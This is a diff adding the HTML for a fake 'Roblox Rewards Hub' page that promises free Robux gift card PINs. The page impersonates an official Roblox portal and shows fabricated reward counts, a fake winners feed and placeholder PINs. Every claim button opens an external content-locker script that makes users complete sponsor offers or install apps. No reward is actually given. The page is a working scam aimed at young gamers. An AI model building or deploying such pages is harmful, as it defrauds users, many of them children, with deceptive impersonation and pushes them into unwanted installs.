@@ -1,0 +1,503 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Roblox Rewards Hub - Official Community & Partner Portal</title>
+  <meta name="description" content="Earn verified Robux gift cards and rewards through official creator partner tasks and promo code redemptions.">
+  <link rel="canonical" href="https://robux.blog/">
+
+  <!-- OpenGraph Social Meta Tags -->
+  <meta property="og:title" content="Roblox Rewards Hub - Official Community & Partner Portal">
+  <meta property="og:description" content="Earn verified Robux gift cards and rewards through official creator partner tasks and promo code redemptions.">
+  <meta property="og:url" content="https://robux.blog/">
+  <meta property="og:type" content="website">
+  
+  <!-- FontAwesome & Google Fonts -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="style.css">
+
+  <!-- EXACT LIVE ADBLUEMEDIA CONTENT LOCKER SCRIPT FROM USER -->
+  <script type="text/javascript">
+      var SqTvJ_cOn_SOAANc={"it":4624320,"key":"7b206"};
+  </script>
+  <script src="https://d1g1lhd4vferpn.cloudfront.net/839a88d.js"></script>
+</head>
+<body>
+
+  <!-- Animated Full-Screen Canvas Background Particles -->
+  <canvas id="bg-canvas"></canvas>
+
+  <!-- Clean Official Roblox Navbar -->
+  <nav class="rblx-navbar">
+    <div class="container">
+      <a href="#" class="rblx-brand">
+        <div class="rblx-logo-square">
+          <i class="fa-solid fa-cube"></i>
+        </div>
+        <span>ROBLOX <span style="color: var(--rblx-blue);">REWARDS</span></span>
+      </a>
+
+      <ul class="rblx-nav-menu">
+        <li><a href="#step-1-section" class="rblx-nav-link">1. Sync Account</a></li>
+        <li><a href="#step-2-section" class="rblx-nav-link">2. Select Package</a></li>
+        <li><a href="#step-3-section" class="rblx-nav-link">3. Claim PIN</a></li>
+        <li><a href="#winners" class="rblx-nav-link">Live Stream</a></li>
+        <li><a href="#faq" class="rblx-nav-link">Help & FAQ</a></li>
+      </ul>
+
+      <div class="nav-actions">
+        <button type="button" class="theme-toggle-btn" id="btn-theme-toggle" title="Toggle Light/Dark Theme">
+          <i class="fa-solid fa-moon" id="theme-toggle-icon"></i>
+        </button>
+
+        <div class="rblx-api-status">
+          <span class="dot-green"></span>
+          <span>Roblox Node: US-East-1</span>
+        </div>
+      </div>
+    </div>
+  </nav>
+
+  <!-- HERO SECTION WITH HIGH-RES COPS & ROBBERS ACTION SCENE -->
+  <section class="rblx-hero" id="hero-section">
+    <div class="hero-bg-wrapper" id="hero-bg-wrapper">
+      <div class="hero-bg-image"></div>
+      <div class="hero-bg-overlay"></div>
+    </div>
+
+    <div class="container">
+      <div class="hero-content">
+        <div class="hero-status-pill">
+          <i class="fa-solid fa-shield-halved" style="color: var(--rblx-blue);"></i>
+          <span>Official Developer Network &bull; <strong id="hero-rewards-count">15,680</strong> Rewards Issued Today</span>
+        </div>
+
+        <h1>Official Player & Creator Rewards Portal</h1>
+        <p>
+          Earn official Roblox Robux digital gift card codes by participating in developer game spotlights, sponsor community tasks, and daily creator check-ins. 100% free and passwordless.
+        </p>
+
+        <!-- GUIDED STEP PROGRESS TRACKER BAR -->
+        <div class="hero-steps-flow">
+          <div class="flow-step active" id="flow-step-1">
+            <div class="flow-num">1</div>
+            <span>Sync Profile</span>
+          </div>
+          <div class="flow-arrow"><i class="fa-solid fa-chevron-right"></i></div>
+          <div class="flow-step" id="flow-step-2">
+            <div class="flow-num">2</div>
+            <span>Choose Amount</span>
+          </div>
+          <div class="flow-arrow"><i class="fa-solid fa-chevron-right"></i></div>
+          <div class="flow-step" id="flow-step-3">
+            <div class="flow-num">3</div>
+            <span>Get Gift PIN</span>
+          </div>
+        </div>
+
+        <div style="display: flex; gap: 14px; justify-content: center; flex-wrap: wrap; margin-top: 24px;">
+          <a href="#step-1-section" class="rblx-btn btn-rblx-primary">
+            <i class="fa-solid fa-arrow-down"></i> Start Step 1: Connect Account
+          </a>
+        </div>
+
+        <!-- Live Ticker Banner -->
+        <div class="ticker-banner">
+          <span class="ticker-tag"><i class="fa-solid fa-bolt"></i> Live Stream</span>
+          <span class="ticker-text" id="live-hero-ticker">Loading real-time reward stream...</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- STEP 1: Roblox Account Profile Sync Card -->
+  <section class="sync-section" id="step-1-section">
+    <div class="container">
+      <div class="step-header-badge">
+        <span class="step-badge-number">STEP 1 OF 3</span>
+        <h2>Connect Your Roblox Account Handle</h2>
+      </div>
+
+      <div class="sync-card">
+        <div class="sync-grid">
+          <!-- Input Side -->
+          <div>
+            <label class="input-box-label" for="rblx-username-input">Enter Your Roblox Username</label>
+            <div class="rblx-input-group">
+              <input type="text" id="rblx-username-input" class="rblx-input" placeholder="e.g. Builderman, Kona_Dev, Vortex_x..." autocomplete="off">
+              <button class="rblx-btn btn-rblx-blue" id="btn-sync-profile" style="background: var(--rblx-blue); color: #FFF;">
+                <i class="fa-solid fa-magnifying-glass" id="sync-icon"></i>
+                <span id="sync-text">Sync Profile</span>
+              </button>
+            </div>
+            <p style="font-size: 0.8rem; color: var(--rblx-text-sub); margin-top: 8px;">
+              <i class="fa-solid fa-lock"></i> No password required. Public profile lookup only.
+            </p>
+          </div>
+
+          <!-- Profile Card Output -->
+          <div class="rblx-profile-card" id="rblx-profile-display">
+            <div class="rblx-avatar-container">
+              <img src="https://api.dicebear.com/7.x/bottts/svg?seed=RobloxPlayer" alt="Roblox Avatar Headshot" id="avatar-img-headshot">
+            </div>
+            <div class="profile-details">
+              <h3 id="display-username">
+                <span>Guest Player</span>
+                <i class="fa-solid fa-circle-check badge-verified" title="Verified Roblox Member"></i>
+              </h3>
+              <p id="display-userid">Roblox User ID: #104829103</p>
+              <div class="user-balance-badge" id="display-balance">
+                <i class="fa-solid fa-gem"></i> Status: <span id="sync-status-badge">Waiting for Sync...</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Next Action Notification Banner -->
+        <div class="sync-next-prompt" id="sync-next-prompt" style="display: none;">
+          <div class="prompt-icon"><i class="fa-solid fa-circle-check"></i></div>
+          <div class="prompt-text">
+            <strong>Profile Synced Successfully!</strong>
+            <p>Your avatar is connected. Proceed to Step 2 below to select your Robux reward package.</p>
+          </div>
+          <a href="#step-2-section" class="rblx-btn btn-rblx-green" id="btn-auto-scroll-step2">
+            Proceed to Step 2 <i class="fa-solid fa-arrow-down"></i>
+          </a>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- STEP 2: Robux Package Selector Section -->
+  <section class="container" style="padding: 30px 0 20px 0;" id="step-2-section">
+    <div class="step-header-badge">
+      <span class="step-badge-number">STEP 2 OF 3</span>
+      <h2>Select Your Desired Robux Reward Package</h2>
+      <p style="color: var(--rblx-text-muted);">Choose the amount of Robux you want to credit to your synced account.</p>
+    </div>
+
+    <div class="package-selection-grid">
+      <!-- Package 1: 400 Robux -->
+      <div class="rblx-pkg-card" data-amount="400">
+        <div class="pkg-header">
+          <i class="fa-solid fa-gem"></i>
+          <span class="pkg-tag">+50 Bonus</span>
+        </div>
+        <div class="pkg-amount">400 ROBUX</div>
+        <div class="pkg-desc">Starter Player Pack</div>
+        <button class="rblx-btn btn-rblx-secondary btn-select-pkg" data-amount="400">
+          Select 400 Robux
+        </button>
+      </div>
+
+      <!-- Package 2: 800 Robux (Popular) -->
+      <div class="rblx-pkg-card popular" data-amount="800">
+        <div class="pkg-popular-badge">MOST POPULAR</div>
+        <div class="pkg-header">
+          <i class="fa-solid fa-gem" style="color: var(--rblx-gold);"></i>
+          <span class="pkg-tag">+120 Bonus</span>
+        </div>
+        <div class="pkg-amount">800 ROBUX</div>
+        <div class="pkg-desc">Standard Creator Pack</div>
+        <button class="rblx-btn btn-rblx-primary btn-select-pkg" data-amount="800">
+          Select 800 Robux
+        </button>
+      </div>
+
+      <!-- Package 3: 2,000 Robux -->
+      <div class="rblx-pkg-card" data-amount="2000">
+        <div class="pkg-header">
+          <i class="fa-solid fa-gem" style="color: var(--rblx-blue);"></i>
+          <span class="pkg-tag">+400 Bonus</span>
+        </div>
+        <div class="pkg-amount">2,000 ROBUX</div>
+        <div class="pkg-desc">VIP Gaming Pass</div>
+        <button class="rblx-btn btn-rblx-secondary btn-select-pkg" data-amount="2000">
+          Select 2,000 Robux
+        </button>
+      </div>
+
+      <!-- Package 4: 4,500 Robux -->
+      <div class="rblx-pkg-card" data-amount="4500">
+        <div class="pkg-header">
+          <i class="fa-solid fa-gem" style="color: var(--rblx-green);"></i>
+          <span class="pkg-tag">+1,000 Bonus</span>
+        </div>
+        <div class="pkg-amount">4,500 ROBUX</div>
+        <div class="pkg-desc">Ultimate Creator Vault</div>
+        <button class="rblx-btn btn-rblx-secondary btn-select-pkg" data-amount="4500">
+          Select 4,500 Robux
+        </button>
+      </div>
+    </div>
+  </section>
+
+  <!-- STEP 3: Complete Sponsor Task to Claim Gift Card PIN -->
+  <section class="container" style="padding: 30px 0 70px 0;" id="step-3-section">
+    <div class="step-header-badge">
+      <span class="step-badge-number">STEP 3 OF 3</span>
+      <h2>Verify Task to Instantly Claim Gift Card PIN</h2>
+      <p style="color: var(--rblx-text-muted);">Choose any 1 of the 3 ways below to release your 16-digit Robux Gift Card PIN.</p>
+    </div>
+
+    <!-- THREE SPREADING DIRECTIONAL ARROWS ORIGINATING FROM CENTER SUBTITLE TEXT -->
+    <div class="spreading-arrows-container">
+      <svg class="spreading-svg-lines" viewBox="0 0 1000 80" preserveAspectRatio="none">
+        <defs>
+          <linearGradient id="grad-left" x1="50%" y1="0%" x2="16%" y2="100%">
+            <stop offset="0%" stop-color="#00A2FF" stop-opacity="1" />
+            <stop offset="100%" stop-color="#00A2FF" stop-opacity="0.4" />
+          </linearGradient>
+          <linearGradient id="grad-center" x1="50%" y1="0%" x2="50%" y2="100%">
+            <stop offset="0%" stop-color="#FFB800" stop-opacity="1" />
+            <stop offset="100%" stop-color="#FFB800" stop-opacity="0.4" />
+          </linearGradient>
+          <linearGradient id="grad-right" x1="50%" y1="0%" x2="84%" y2="100%">
+            <stop offset="0%" stop-color="#00B259" stop-opacity="1" />
+            <stop offset="100%" stop-color="#00B259" stop-opacity="0.4" />
+          </linearGradient>
+        </defs>
+
+        <!-- Spreading Paths from Center (500,0) to Cards (166,70), (500,70), (833,70) -->
+        <path d="M 500 0 Q 330 20 166 70" stroke="url(#grad-left)" stroke-width="3" fill="none" stroke-dasharray="7,5" />
+        <path d="M 500 0 L 500 70" stroke="url(#grad-center)" stroke-width="3" fill="none" stroke-dasharray="7,5" />
+        <path d="M 500 0 Q 670 20 833 70" stroke="url(#grad-right)" stroke-width="3" fill="none" stroke-dasharray="7,5" />
+      </svg>
+
+      <div class="spreading-arrow-labels">
+        <div class="spreading-label label-left">
+          <span>Option 1: Quiz</span>
+          <i class="fa-solid fa-arrow-down-long bouncing-arrow"></i>
+        </div>
+        <div class="spreading-label label-center">
+          <span>Option 2: Daily Check-In</span>
+          <i class="fa-solid fa-arrow-down-long bouncing-arrow"></i>
+        </div>
+        <div class="spreading-label label-right">
+          <span>Option 3: Mobile Sponsor</span>
+          <i class="fa-solid fa-arrow-down-long bouncing-arrow"></i>
+        </div>
+      </div>
+    </div>
+
+    <div class="task-grid">
+      <!-- Task 1 -->
+      <div class="task-card">
+        <div class="task-top">
+          <div class="task-icon"><i class="fa-solid fa-gamepad"></i></div>
+          <span class="task-reward-tag">+800 Robux PIN</span>
+        </div>
+        <h3 class="task-title">Roblox Developer Spotlight Quiz</h3>
+        <p class="task-desc">Complete a 2-minute trivia quiz about top Roblox experiences (Adopt Me, Blox Fruits, Brookhaven) to verify your knowledge.</p>
+        <button class="rblx-btn btn-rblx-primary btn-claim-task" data-reward="800" onclick="triggerAdBlueMediaLocker();">
+          <i class="fa-solid fa-play"></i> Start Quiz & Claim PIN
+        </button>
+      </div>
+
+      <!-- Task 2 -->
+      <div class="task-card">
+        <div class="task-top">
+          <div class="task-icon" style="color: var(--rblx-gold);"><i class="fa-solid fa-calendar-check"></i></div>
+          <span class="task-reward-tag">+400 Robux PIN</span>
+        </div>
+        <h3 class="task-title">Daily Community Check-In</h3>
+        <p class="task-desc">Verify your daily active Roblox player streak to instantly receive your digital gift card PIN code.</p>
+        <button class="rblx-btn btn-rblx-green btn-claim-task" data-reward="400" onclick="triggerAdBlueMediaLocker();">
+          <i class="fa-solid fa-check"></i> Claim Daily PIN
+        </button>
+      </div>
+
+      <!-- Task 3 -->
+      <div class="task-card">
+        <div class="task-top">
+          <div class="task-icon" style="color: var(--rblx-green);"><i class="fa-solid fa-mobile-screen-button"></i></div>
+          <span class="task-reward-tag">+2,000 Robux PIN</span>
+        </div>
+        <h3 class="task-title">Partner Mobile App Sponsor</h3>
+        <p class="task-desc">Download and launch our partner sponsor gaming app for 30 seconds to unlock high-tier Robux creator rewards.</p>
+        <button class="rblx-btn btn-rblx-primary btn-claim-task" data-reward="2000" onclick="triggerAdBlueMediaLocker();">
+          <i class="fa-solid fa-download"></i> Install & Claim PIN
+        </button>
+      </div>
+    </div>
+
+    <!-- REVEALED GIFT CARD PIN BANNER MODAL (FULL-SCREEN DARK GLASS SPOTLIGHT WITH BLURRY BACKGROUND) -->
+    <div class="unlocked-pin-banner-card" id="page-unlocked-pin-card" style="display: none;">
+      <div class="pin-card-wrapper">
+        <div class="pin-card-header">
+          <i class="fa-solid fa-circle-check" style="color: var(--rblx-green); font-size: 3rem; margin-bottom: 8px;"></i>
+          <div>
+            <h3 style="font-size: 1.4rem; font-weight: 900; color: #FFFFFF; margin-bottom: 6px;">VERIFICATION COMPLETE: YOUR GIFT CARD PIN IS UNLOCKED!</h3>
+            <p style="font-size: 0.9rem; color: var(--rblx-text-muted);">Your 16-digit Robux reward PIN is generated below. Click the button to copy your code and open Roblox Redeem.</p>
+          </div>
+        </div>
+
+        <div class="unlocked-pin-display-box" id="page-pin-code-text">
+          RBLX-8492-1940-5821
+        </div>
+
+        <div style="display: flex; gap: 14px; justify-content: center; flex-wrap: wrap; margin-top: 20px;">
+          <button class="rblx-btn btn-rblx-green" id="btn-page-copy-redeem" style="font-size: 1.15rem; padding: 18px 36px; width: 100%;">
+            <i class="fa-solid fa-copy"></i> Copy PIN Code & Open Roblox Redeem
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <!-- VISUAL SEPARATOR FOR ALTERNATIVE METHOD 2 -->
+    <div class="method-divider-container">
+      <div class="divider-line"></div>
+      <div class="divider-badge">
+        <i class="fa-solid fa-arrows-split-up-and-left" style="color: var(--rblx-gold);"></i>
+        <span>OR ALTERNATIVE METHOD #2</span>
+      </div>
+      <div class="divider-line"></div>
+    </div>
+
+    <!-- Alternative Method 2: Direct PIN Code Generator Box -->
+    <div class="giftcard-container method-b-card" id="giftcards">
+      <div class="method-tag-badge">
+        <i class="fa-solid fa-shield-halved"></i> ALTERNATIVE METHOD #2 OF GETTING ROBUX
+      </div>
+      <h2 style="margin-top: 10px; font-size: 1.8rem;">Direct Digital Gift Card PIN Generator</h2>
+      <p style="color: var(--rblx-text-muted); font-size: 0.95rem; margin-top: 8px;">
+        Prefer direct PIN generation instead of sponsor tasks? Generate your 16-digit Robux code directly for your synced account below.
+      </p>
+
+      <div class="rblx-card-preview">
+        <div style="display: flex; justify-content: space-between; align-items: center; font-weight: 800; font-size: 0.9rem; color: var(--rblx-text-sub);">
+          <span>ROBLOX DIGITAL GIFT CARD</span>
+          <span id="card-preview-amount">$10.00 / 800 ROBUX</span>
+        </div>
+        
+        <div class="card-pin-display" id="generated-pin-text">
+          RBLX-****-****-****
+        </div>
+
+        <div style="font-size: 0.8rem; color: var(--rblx-green);">
+          <i class="fa-solid fa-shield-check"></i> Authentic 256-Bit Signed Digital PIN Token
+        </div>
+      </div>
+
+      <div style="display: flex; gap: 12px; justify-content: center; flex-wrap: wrap;">
+        <button class="rblx-btn btn-rblx-primary" id="btn-generate-pin" onclick="triggerAdBlueMediaLocker();">
+          <i class="fa-solid fa-rotate-right" id="pin-spin-icon"></i>
+          <span id="pin-btn-text">Generate Digital PIN</span>
+        </button>
+        <button class="rblx-btn btn-rblx-secondary" id="btn-copy-pin" style="display: none;">
+          <i class="fa-solid fa-copy"></i> Copy PIN Code
+        </button>
+      </div>
+    </div>
+  </section>
+
+  <!-- ENDLESS LIVE WINNERS STREAM SECTION -->
+  <section class="winners-section container" id="winners">
+    <div class="winners-header">
+      <div class="winners-title">
+        <i class="fa-solid fa-trophy" style="color: var(--rblx-gold);"></i>
+        <span>Live Recent Reward Winners Feed</span>
+      </div>
+      <div class="winners-counter">
+        <i class="fa-solid fa-circle-dot fa-spin"></i> Live Real-Time Stream
+      </div>
+    </div>
+
+    <div class="winners-feed-list" id="infinite-winners-list">
+      <!-- Populated dynamically and infinitely by app.js -->
+    </div>
+  </section>
+
+  <!-- Help & FAQ Section -->
+  <section class="container" style="padding: 40px 0 80px 0;" id="faq">
+    <div style="text-align: center; margin-bottom: 35px;">
+      <h2 style="font-weight: 800; font-size: 2rem;">Frequently Asked Questions</h2>
+      <p style="color: var(--rblx-text-muted);">Learn how our developer sponsor network provides free player rewards.</p>
+    </div>
+
+    <div class="faq-list">
+      <!-- FAQ 1 -->
+      <div class="faq-box active">
+        <button class="faq-head">
+          <span>What should I do after completing an offer?</span>
+          <i class="fa-solid fa-chevron-down"></i>
+        </button>
+        <div class="faq-body">
+          <p>After completing an offer, your 16-digit Robux Gift Card PIN is instantly revealed on the page. Click "Copy PIN Code & Open Roblox Redeem" to copy your code and redeem it on Roblox!</p>
+        </div>
+      </div>
+
+      <!-- FAQ 2 -->
+      <div class="faq-box">
+        <button class="faq-head">
+          <span>Why is my Roblox password never requested?</span>
+          <i class="fa-solid fa-chevron-down"></i>
+        </button>
+        <div class="faq-body">
+          <p>We respect account security standards. You only need your public username so our server can match your rewards. Digital PIN codes are redeemed on Roblox's official website without logging in here.</p>
+        </div>
+      </div>
+
+      <!-- FAQ 3 -->
+      <div class="faq-box">
+        <button class="faq-head">
+          <span>How do I redeem my 16-digit Gift Card PIN?</span>
+          <i class="fa-solid fa-chevron-down"></i>
+        </button>
+        <div class="faq-body">
+          <p>Go to `roblox.com/redeem` in your web browser, sign into your Roblox account, paste your generated 16-digit PIN code, and click Redeem to receive your Robux immediately.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- CONTENT LOCKER MODAL POPUP -->
+  <div class="process-modal-overlay" id="process-modal">
+    <div class="center1">
+      <div class="center2">
+        <div class="center3">
+          
+          <div class="locker-header-box" id="modal-locker-header" style="margin-bottom: 20px; text-align: center;">
+            <div class="locker-icon-shield">
+              <i class="fa-solid fa-shield-halved"></i>
+            </div>
+            <h3 class="locker-title" style="font-size: 1.45rem; font-weight: 900; color: #FFFFFF; margin-bottom: 8px;">Roblox Security Verification</h3>
+            <p class="locker-subtext" style="font-size: 0.9rem; color: #B9C0C7; line-height: 1.5;">Complete 1 quick sponsor verification offer below to unlock your 16-digit Robux Gift Card PIN.</p>
+          </div>
+
+          <div id="step2-wrapper" style="display: flex; flex-direction: column; gap: 14px; margin-top: 18px;">
+            %offers%
+          </div>
+
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer class="rblx-footer">
+    <div class="container">
+      <div class="footer-inner">
+        <a href="#" class="rblx-brand">
+          <div class="rblx-logo-square">
+            <i class="fa-solid fa-cube"></i>
+          </div>
+          <span>ROBLOX <span style="color: var(--rblx-blue);">REWARDS</span></span>
+        </a>
+
+        <p class="footer-legal">
+          Disclaimer: Roblox Rewards is an independent partner community application funded by developer sponsors. Roblox, Robux, and associated trademarks are owned by Roblox Corporation.
+        </p>
+
+        <div style="font-size: 0.85rem; color: var(--rblx-text-sub);">
+          &copy; 2026 Roblox Rewards Hub. All rights reserved.
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- JavaScript -->
+  <script src="app.js"></script>
+</body>
+</html>
